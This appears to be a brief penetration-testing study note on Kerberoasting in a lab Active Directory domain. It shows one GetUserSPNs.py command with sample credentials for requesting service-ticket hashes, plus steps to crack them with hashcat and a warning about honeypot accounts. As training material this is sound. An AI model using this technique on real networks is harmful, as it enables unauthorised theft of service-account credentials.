Kerberoasting Walkthrough

Tuesday, October 10, 2023

9:48 PM

> Finding and cracking service accounts passwords
>
>  

-   Example command

    -   sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc 10.0.2.250 -request

![](005_Kerberoasting_Walkthrough_000.png){width="17.270833333333332in" height="4.59375in"}

\*Careful of no logon or old logon could be honeypot\*

 

-   Save hash in file and crack with hashcat

> ![](005_Kerberoasting_Walkthrough_001.png){width="12.354166666666666in" height="5.53125in"}
>
>  
>
> ![](005_Kerberoasting_Walkthrough_002.png){width="17.3125in" height="6.46875in"}
>
>  
